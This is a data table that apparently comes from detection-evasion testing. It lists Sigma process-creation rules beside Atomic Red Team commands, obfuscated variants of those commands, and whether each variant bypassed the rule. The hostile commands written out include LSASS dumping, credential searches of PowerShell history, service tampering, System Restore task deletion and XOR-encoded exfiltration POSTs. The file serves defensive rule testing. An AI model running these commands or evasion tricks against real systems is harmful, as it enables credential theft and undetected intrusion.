Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218.008	proc_creation_win_odbcconf_register_dll_regsvr	New DLL Registered Via Odbcconf.EXE	9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70		"odbcconf.exe /S /A {""REGSVR"" ""C:\AtomicRedTeam\atomics\T1218.008\src\Win32\T1218-2.dll""}"	TRUE	TRUE	TRUE	
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868	"odbcconf.exe   -f \""T1218.008.rsp\"""	"odbcconf.exe  -f ""T1218.008.rsp"""	TRUE	FALSE	FALSE	Response File Execution Via Odbcconf.EXE (5f03babb-12db-4eec-8c82-7b4cb5580868)
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868		"odbcconf.exe ""-f"" ""T1218.008.rsp"""	TRUE	TRUE	TRUE	
t1218.008	proc_creation_win_odbcconf_response_file	Response File Execution Via Odbcconf.EXE	5f03babb-12db-4eec-8c82-7b4cb5580868		"odbcconf.exe -f ""T1218.008.rs""""p"""	TRUE	TRUE	FALSE	Suspicious Response File Execution Via Odbcconf.EXE (2d32dd6f-3196-4093-b9eb-1ad8ab088ca5)
t1123	proc_creation_win_powershell_audio_capture	Audio Capture via PowerShell	932fb0d8-692b-4b0f-a26e-5643a50fe7d6		"""powershell.exe"" & {$mic = Get-AudioDevice  -Recording
Set-AudioDevice  -ID $mic.ID
Start-Sleep -Seconds 5}"	FALSE	FALSE	FALSE	
t1123	proc_creation_win_powershell_audio_capture	Audio Capture via PowerShell	932fb0d8-692b-4b0f-a26e-5643a50fe7d6		"""powershell.exe"" & {$mic = & 'Get-AudioDevice' -Recording
& 'Set-AudioDevice' -ID $mic.ID
Start-Sleep -Seconds 5}"	FALSE	FALSE	FALSE	
t1123	proc_creation_win_powershell_audio_capture	Audio Capture via PowerShell	932fb0d8-692b-4b0f-a26e-5643a50fe7d6		"cmd.exe /c ""powershell.exe & {$mic = Get-Audio^Device -Recording; Set-Audio^Device -ID $mic.ID; Start-Sleep -Seconds 5}"""	FALSE	FALSE	FALSE	
t1552.001	proc_creation_win_powershell_console_history_file_access	Potential PowerShell Console History Access Attempt via History File	f4ff7323-b5fc-4323-8b52-6b9408e15788		"""powershell.exe"" & {ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_histor""""y.txt | Select-String """"password"""", """"-p"""", """"key"""", """"pwd"""", """"pass""""}"	FALSE	FALSE	FALSE	
t1552.001	proc_creation_win_powershell_console_history_file_access	Potential PowerShell Console History Access Attempt via History File	f4ff7323-b5fc-4323-8b52-6b9408e15788		"cmd.exe /c ""powershell.exe & {ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_hist^ory.txt | Select-String """"password"""", """"-p"""", """"key"""", """"pwd"""", """"pass""""}"""	FALSE	FALSE	FALSE	
t1552.001	proc_creation_win_powershell_console_history_file_access	Potential PowerShell Console History Access Attempt via History File	f4ff7323-b5fc-4323-8b52-6b9408e15788		"""powershell.exe"" & {$path = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\Console' + 'Host_history.txt'); ls $path | Select-String """"password"""", """"-p"""", """"key"""", """"pwd"""", """"pass""""}"	FALSE	FALSE	FALSE	
t1543.003	proc_creation_win_powershell_create_service	New Service Creation Using PowerShell	c02e96b7-c63a-4c47-bd83-4a9f74afcfb2		"powershell.exe -c New-Service -Name svcHighPriv -BinaryPath""""Name 'C:\windows\system32\cmd.exe' -StartupType Manual"	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1543.003	proc_creation_win_powershell_create_service	New Service Creation Using PowerShell	c02e96b7-c63a-4c47-bd83-4a9f74afcfb2	"cmd.exe /c ""powershell.exe -c \""& 'New-Service' -Name svcHighPriv -BinaryPathName 'C:\windows\system32\cmd.exe'\"""""	"powershell.exe -c ""& 'New-Service' -Name svcHighPriv -BinaryPathName 'C:\windows\system32\cmd.exe'"""	TRUE	FALSE	FALSE	Suspicious New Service Creation (17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8); Suspicious New Service Creation (17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8); New Service Creation Using PowerShell (c02e96b7-c63a-4c47-bd83-4a9f74afcfb2); New Service Creation Using PowerShell (c02e96b7-c63a-4c47-bd83-4a9f74afcfb2); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1543.003	proc_creation_win_powershell_create_service	New Service Creation Using PowerShell	c02e96b7-c63a-4c47-bd83-4a9f74afcfb2		powershell.exe -c New-Service -Name svcHighPriv -Bin 'C:\windows\system32\cmd.exe' -StartupType Manual	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1543.003	proc_creation_win_sc_create_service	New Service Creation Using Sc.EXE	85ff530b-261d-48c6-a441-facaa2e81e48	"sc.exe  create AtomicService binPath= \""C:\Windows\System32\calc.exe\"""	"cmd.exe /c sc.exe c^re^ate AtomicService bi^nPath= ""C:\Windows\System32\calc.exe"""	TRUE	FALSE	FALSE	New Service Creation Using Sc.EXE (85ff530b-261d-48c6-a441-facaa2e81e48)
t1543.003	proc_creation_win_sc_create_service	New Service Creation Using Sc.EXE	85ff530b-261d-48c6-a441-facaa2e81e48	"sc.exe  \""create\"" AtomicService \""binPath\""= \""C:\Windows\System32\calc.exe\"""	"sc.exe ""create"" AtomicService ""binPath""= ""C:\Windows\System32\calc.exe"""	TRUE	FALSE	FALSE	New Service Creation Using Sc.EXE (85ff530b-261d-48c6-a441-facaa2e81e48)
t1543.003	proc_creation_win_sc_create_service	New Service Creation Using Sc.EXE	85ff530b-261d-48c6-a441-facaa2e81e48	"sc.exe  create AtomicService binPath= \""C:\Windows\System32\calc.exe\"""	"sc.exe create AtomicService binPath^= ""C:\Windows\System32\calc.exe"""	TRUE	FALSE	FALSE	New Service Creation Using Sc.EXE (85ff530b-261d-48c6-a441-facaa2e81e48)
t1543.003	proc_creation_win_sc_sdset_allow_service_changes	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE	6c8fbee5-dee8-49bc-851d-c3142d02aa47	sc.exe  sdset scmanager D:(A;;KA;;;WD)	cmd.exe /c sc.exe s^d^s^e^t scmanager D:(A;;KA;;;WD)	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1543.003	proc_creation_win_sc_sdset_allow_service_changes	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE	6c8fbee5-dee8-49bc-851d-c3142d02aa47		"sc.exe ""sdset"" scmanager D:(A;;KA;;;S-1-1-0)"	TRUE	TRUE	FALSE	Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1543.003	proc_creation_win_sc_sdset_allow_service_changes	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE	6c8fbee5-dee8-49bc-851d-c3142d02aa47	"sc.exe  sdset scmanager \""D:(A;;KA;;;WD)\"""	"sc.exe sdset scmanager ""D:(A;;KA;;;WD)"""	TRUE	FALSE	FALSE	Allow Service Access Using Security Descriptor Tampering Via Sc.EXE (6c8fbee5-dee8-49bc-851d-c3142d02aa47); Service Security Descriptor Tampering Via Sc.EXE (98c5aeef-32d5-492f-b174-64a691896d25)
t1059.001	proc_creation_win_powershell_dsinternals_cmdlets	DSInternals Suspicious PowerShell Cmdlets	43d91656-a9b2-4541-b7e2-6a9bd3a13f4e		"""powershell.exe"" & {& 'Get-ADReplAccount' -All -Server $ENV:logonserver.TrimStart("""""")}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_dsinternals_cmdlets	DSInternals Suspicious PowerShell Cmdlets	43d91656-a9b2-4541-b7e2-6a9bd3a13f4e		"cmd.exe /c ""powershell.exe & {Get-ADRepl^Account -All -Server $ENV:logonserver.TrimStart("""""")}"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_dsinternals_cmdlets	DSInternals Suspicious PowerShell Cmdlets	43d91656-a9b2-4541-b7e2-6a9bd3a13f4e		"""powershell.exe"" & {Invoke-Expression ('Get-' + 'ADReplAccount -All -Server $ENV:logonserver.TrimStart("""""")')}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		C:\WINDOWS\system32\cmd.exe /c  powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		"C:\WINDOWS\system32\cmd.exe /c ""powershell.exe"" -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		C:\WINDOWS\system32\cmd.exe /k powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		"""powershell.exe"" & {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim""))
$key = ""abcdefghijklmnopqrstuvwxyz123456""
$cyphertext =  @();
$i = 0; while ($i -lt $plaintext.Count) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
 $i++;
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		"""powershell.exe"" & {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim""))
$key = ""abcdefghijklmnopqrstuvwxyz123456""
$cyphertext =  @();
for	($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		"""powershell.exe"" & {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim""))
$key = ""abcdefghijklmnopqrstuvwxyz123456""
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] "".((Get-Variable *md*).Value.Name[10]+'xor')"".Invoke($key[$i % $key.Length]);
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_susp_data_exfiltration_via_cli	Potential Data Exfiltration Activity Via CommandLine Tools	7d1aaf3d-4304-425c-b7c3-162055e0b3ab		"""powershell.exe"" & {$content = gc C:\Windows\System32\notepad.exe; curl http://127.0.0.1 -method POST -body $content}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_susp_data_exfiltration_via_cli	Potential Data Exfiltration Activity Via CommandLine Tools	7d1aaf3d-4304-425c-b7c3-162055e0b3ab		"""powershell.exe"" & {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim"")); $key = ""abcdefghijklmnopqrstuvwxyz123456""; $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); Invoke-RestMethod -U""""ri example.com -Me""""thod POST -B""""ody $cyphertext}"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_susp_data_exfiltration_via_cli	Potential Data Exfiltration Activity Via CommandLine Tools	7d1aaf3d-4304-425c-b7c3-162055e0b3ab		"""powershell.exe"" & {$content = Get-Content C:\Windows\System32\notepad.exe; [System.Net.HttpWebRequest]::Create(""http://127.0.0.1"") | % {$_.Method=""POST""; $writer = [System.IO.StreamWriter]$_.GetRequestStream(); $writer.Write($content); $writer.Close(); $_.GetResponse().Close()}}"	FALSE	FALSE	FALSE	
t1115	proc_creation_win_powershell_get_clipboard	PowerShell Get-Clipboard Cmdlet Via CLI	b9aeac14-2ffd-4ad3-b967-1354a4e628c3		"""powershell.exe"" & {echo Get-Process | clip
& 'Get-Clipboard' | iex}"	FALSE	FALSE	FALSE	
t1115	proc_creation_win_powershell_get_clipboard	PowerShell Get-Clipboard Cmdlet Via CLI	b9aeac14-2ffd-4ad3-b967-1354a4e628c3		"cmd.exe /c ""powershell.exe & {echo Get-Process | clip; Get-Clip^board | iex}"""	FALSE	FALSE	FALSE	
t1115	proc_creation_win_powershell_get_clipboard	PowerShell Get-Clipboard Cmdlet Via CLI	b9aeac14-2ffd-4ad3-b967-1354a4e628c3		"""powershell.exe"" & {echo Get-Process | clip
Invoke-Expression ('Get-' + 'Clipboard') | iex}"	FALSE	FALSE	FALSE	
t1552.004	proc_creation_win_powershell_getprocess_lsass	PowerShell Get-Process LSASS	b2815d0d-7481-4bf0-9b6c-a4c48a94b349		"""powershell.exe"" & {get-process  lsass | Out-Minidump}"	FALSE	FALSE	FALSE	
t1552.004	proc_creation_win_powershell_getprocess_lsass	PowerShell Get-Process LSASS	b2815d0d-7481-4bf0-9b6c-a4c48a94b349		"""powershell.exe"" & {& 'Get-Process' lsass | Out-Minidump}"	FALSE	FALSE	FALSE	
t1552.004	proc_creation_win_powershell_getprocess_lsass	PowerShell Get-Process LSASS	b2815d0d-7481-4bf0-9b6c-a4c48a94b349		"""powershell.exe"" & {Get-Process -Name lsass | Out-Minidump}"	FALSE	FALSE	FALSE	
t1552.004	proc_creation_win_susp_private_keys_recon	Private Keys Reconnaissance Via CommandLine Tools	213d6a77-3d55-4ce8-ba74-fcfef741974e	cmd.exe  /c dir c:\ /b /s .key	cmd.exe /c d^ir c:\ /b /s .key	TRUE	FALSE	FALSE	Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004	proc_creation_win_susp_private_keys_recon	Private Keys Reconnaissance Via CommandLine Tools	213d6a77-3d55-4ce8-ba74-fcfef741974e		"powershell.exe -Command ""gci -Path C:\ -Recurse -Include *.key"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1552.004	proc_creation_win_susp_private_keys_recon	Private Keys Reconnaissance Via CommandLine Tools	213d6a77-3d55-4ce8-ba74-fcfef741974e		"cmd.exe /c ""dir"""" c:\ /b /s .key"	TRUE	TRUE	FALSE	File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1552.004	proc_creation_win_susp_private_keys_recon	Private Keys Reconnaissance Via CommandLine Tools	213d6a77-3d55-4ce8-ba74-fcfef741974e		"powershell.exe -Command ""& {Get-ChildItem"""" -Path C:\ -Filter *.key}"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1505.002	proc_creation_win_powershell_msexchange_transport_agent	MSExchange Transport Agent Installation	83809e84-4475-4b69-bc3e-4aad8568612f		"""powershell.exe"" & {& 'Install-TransportAgent' -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15in\Microsoft.Exchange.Security.Interop.dll}"	FALSE	FALSE	FALSE	
t1505.002	proc_creation_win_powershell_msexchange_transport_agent	MSExchange Transport Agent Installation	83809e84-4475-4b69-bc3e-4aad8568612f		"cmd.exe /c ""powershell.exe & {Install-Transport^Agent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15in\Microsoft.Exchange.Security.Interop.dll}"""	FALSE	FALSE	FALSE	
t1505.002	proc_creation_win_powershell_msexchange_transport_agent	MSExchange Transport Agent Installation	83809e84-4475-4b69-bc3e-4aad8568612f		"""powershell.exe"" & {Invoke-Expression ('Install-' + 'TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15in\Microsoft.Exchange.Security.Interop.dll')}"	FALSE	FALSE	FALSE	
t1564.004	proc_creation_win_powershell_run_script_from_ads	Run PowerShell Script from ADS	45a594aa-1fbd-4972-a809-ff5a99dd81b8		"""powershell.exe"" & {Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream  'streamcommand'
Invoke-Expression $streamcommand}"	FALSE	FALSE	FALSE	
t1564.004	proc_creation_win_powershell_run_script_from_ads	Run PowerShell Script from ADS	45a594aa-1fbd-4972-a809-ff5a99dd81b8		"""powershell.exe"" & {Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'
$streamcommand = & 'Get-Content' -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand}"	FALSE	FALSE	FALSE	
t1564.004	proc_creation_win_powershell_run_script_from_ads	Run PowerShell Script from ADS	45a594aa-1fbd-4972-a809-ff5a99dd81b8		"""powershell.exe"" & {Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Str 'streamcommand'
Invoke-Expression $streamcommand}"	FALSE	FALSE	FALSE	
t1564.004	proc_creation_win_susp_hidden_dir_index_allocation	Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI	0900463c-b33b-49a8-be1d-552a3b553dae		"""cmd.exe"" /c md %temp%\...$.......::""$index_allocation"" & echo too many secrets > %temp%\...$.......::""$index_allocation""\secrets.txt"	FALSE	FALSE	FALSE	
t1564.004	proc_creation_win_susp_hidden_dir_index_allocation	Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI	0900463c-b33b-49a8-be1d-552a3b553dae		"""cmd.exe"" /c set STREAM=::$index_allocation && md %temp%\...$.......%STREAM% & echo too many secrets > %temp%\...$.......%STREAM%\secrets.txt"	FALSE	FALSE	FALSE	
t1564.004	proc_creation_win_susp_hidden_dir_index_allocation	Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI	0900463c-b33b-49a8-be1d-552a3b553dae		"""cmd.exe"" /c md %temp%\...$.......::i^n^d^e^x_^a^l^l^o^c^a^t^i^o^n & echo too many secrets > %temp%\...$.......::i^n^d^e^x_^a^l^l^o^c^a^t^i^o^n\secrets.txt"	FALSE	FALSE	FALSE	
t1489	proc_creation_win_powershell_stop_service	Stop Windows Service Via PowerShell Stop-Service	c49c5062-0966-4170-9efd-9968c913a6cf		"""powershell.exe"" & {Stop-Service  -Name """"fax"""" -force -erroraction silentlycontinue}"	FALSE	FALSE	FALSE	
t1489	proc_creation_win_powershell_stop_service	Stop Windows Service Via PowerShell Stop-Service	c49c5062-0966-4170-9efd-9968c913a6cf		"""powershell.exe"" & {& 'Stop-Service' -Name """"fax"""" -force -erroraction silentlycontinue}"	FALSE	FALSE	FALSE	
t1489	proc_creation_win_powershell_stop_service	Stop Windows Service Via PowerShell Stop-Service	c49c5062-0966-4170-9efd-9968c913a6cf		"""powershell.exe"" & {spsv -Name """"fax"""" -force -erroraction silentlycontinue}"	FALSE	FALSE	FALSE	
t1489	proc_creation_win_sc_stop_service	Stop Windows Service Via Sc.EXE	81bcb81b-5b1f-474b-b373-52c871aaa7b1		"sc.exe ""stop"" spooler"	TRUE	TRUE	TRUE	
t1489	proc_creation_win_sc_stop_service	Stop Windows Service Via Sc.EXE	81bcb81b-5b1f-474b-b373-52c871aaa7b1	sc.exe  stop spooler	cmd.exe /c sc.exe st^op spooler	TRUE	FALSE	FALSE	Stop Windows Service Via Sc.EXE (81bcb81b-5b1f-474b-b373-52c871aaa7b1)
t1489	proc_creation_win_sc_stop_service	Stop Windows Service Via Sc.EXE	81bcb81b-5b1f-474b-b373-52c871aaa7b1		sc.exe stop= spooler	TRUE	TRUE	TRUE	
t1489	proc_creation_win_schtasks_delete	Delete Important Scheduled Task	dbc1f800-0fe0-4bc0-9c66-292c2abe3f78		"schtasks.exe -delete -f -tn ""\Microsoft\Windows\SystemRestore\SR"""	TRUE	TRUE	TRUE	
t1489	proc_creation_win_schtasks_delete	Delete Important Scheduled Task	dbc1f800-0fe0-4bc0-9c66-292c2abe3f78	"schtasks.exe  \""/delete\"" /f \""/tn\"" \""\Microsoft\Windows\SystemRestore\SR\"""	"schtasks.exe ""/delete"" /f ""/tn"" ""\Microsoft\Windows\SystemRestore\SR"""	TRUE	FALSE	FALSE	Delete Important Scheduled Task (dbc1f800-0fe0-4bc0-9c66-292c2abe3f78)
t1489	proc_creation_win_schtasks_delete	Delete Important Scheduled Task	dbc1f800-0fe0-4bc0-9c66-292c2abe3f78	"schtasks.exe  /delete /f /tn \""\Microsoft\Windows\SystemRestore\SR\"""	"cmd.exe /c schtasks.exe /del^ete /f /tn ""\Microsoft\Windows\SystemRestore\SR"""	TRUE	FALSE	FALSE	Delete Important Scheduled Task (dbc1f800-0fe0-4bc0-9c66-292c2abe3f78)
t1489	proc_creation_win_schtasks_delete	Delete Important Scheduled Task	dbc1f800-0fe0-4bc0-9c66-292c2abe3f78		"schtasks.exe /delete /f /tn ""/Microsoft/Windows/SystemRestore/SR"""	TRUE	TRUE	TRUE	
t1489	proc_creation_win_schtasks_disable	Disable Important Scheduled Task	9ac94dc8-9042-493c-ba45-3b5e7c86b980		"schtasks.exe -Change -TN ""\Microsoft\Windows\SystemRestore\SR"" -disable"	TRUE	TRUE	TRUE	
t1489	proc_creation_win_schtasks_disable	Disable Important Scheduled Task	9ac94dc8-9042-493c-ba45-3b5e7c86b980	"schtasks.exe  \""/Change\"" /TN \""\Microsoft\Windows\SystemRestore\SR\"" \""/disable\"""	"schtasks.exe ""/Change"" /TN ""\Microsoft\Windows\SystemRestore\SR"" ""/disable"""	TRUE	FALSE	FALSE	Disable Important Scheduled Task (9ac94dc8-9042-493c-ba45-3b5e7c86b980)
t1489	proc_creation_win_schtasks_disable	Disable Important Scheduled Task	9ac94dc8-9042-493c-ba45-3b5e7c86b980	"schtasks.exe  /Change /TN \""\Microsoft\Windows\SystemRestore\SR\"" /disable"	"cmd.exe /c schtasks.exe /Ch^a^nge /TN ""\Microsoft\Windows\SystemRestore\SR"" /dis^able"	TRUE	FALSE	FALSE	Disable Important Scheduled Task (9ac94dc8-9042-493c-ba45-3b5e7c86b980)
t1489	proc_creation_win_schtasks_disable	Disable Important Scheduled Task	9ac94dc8-9042-493c-ba45-3b5e7c86b980		"schtasks.exe /Change /TN ""/Microsoft/Windows/SystemRestore/SR"" /disable"	TRUE	TRUE	TRUE	
t1113	proc_creation_win_psr_capture_screenshots	Screen Capture Activity Via Psr.EXE	2158f96f-43c2-43cb-952a-ab4580f32382	"psr.exe   /start /output c:	emp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12"	"psr.exe  /start /output c:	emp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12"	TRUE	FALSE	FALSE	Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382); Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382); Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382)
t1113	proc_creation_win_psr_capture_screenshots	Screen Capture Activity Via Psr.EXE	2158f96f-43c2-43cb-952a-ab4580f32382	"psr.exe  \""/start\"" /output c:	emp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12"	"psr.exe ""/start"" /output c:	emp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12"	TRUE	FALSE	FALSE	Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382); Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382); Screen Capture Activity Via Psr.EXE (2158f96f-43c2-43cb-952a-ab4580f32382)
t1113	proc_creation_win_psr_capture_screenshots	Screen Capture Activity Via Psr.EXE	2158f96f-43c2-43cb-952a-ab4580f32382		"cmd.exe /c ""psr.exe /^s^t^a^r^t /output c:	emp\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12"""	FALSE	FALSE	FALSE	
t1113	proc_creation_win_reg_enable_windows_recall	Windows Recall Feature Enabled Via Reg.EXE	817f252c-5143-4dae-b418-48c3e9f63728		"""C:\WINDOWS\system32eg.exe"" add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI /v DisableAIData""""Analysis /t REG_DWORD /d 0 /f"	FALSE	FALSE	FALSE	
t1113	proc_creation_win_reg_enable_windows_recall	Windows Recall Feature Enabled Via Reg.EXE	817f252c-5143-4dae-b418-48c3e9f63728		"""C:\WINDOWS\system32eg.exe"" add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f"	FALSE	FALSE	FALSE	
t1113	proc_creation_win_reg_enable_windows_recall	Windows Recall Feature Enabled Via Reg.EXE	817f252c-5143-4dae-b418-48c3e9f63728		"cmd.exe /c """"C:\WINDOWS\system32eg.exe"" del^ete HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI /v DisableAIDataAnalysis /f"""	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		"AdFind.exe -default -s base lockout""""duration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		AdFind.exe  -sc  admincountdmp	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		"cmd.exe /c ""AdFind.exe -s^c exchaddresses"""	FALSE	FALSE	FALSE	
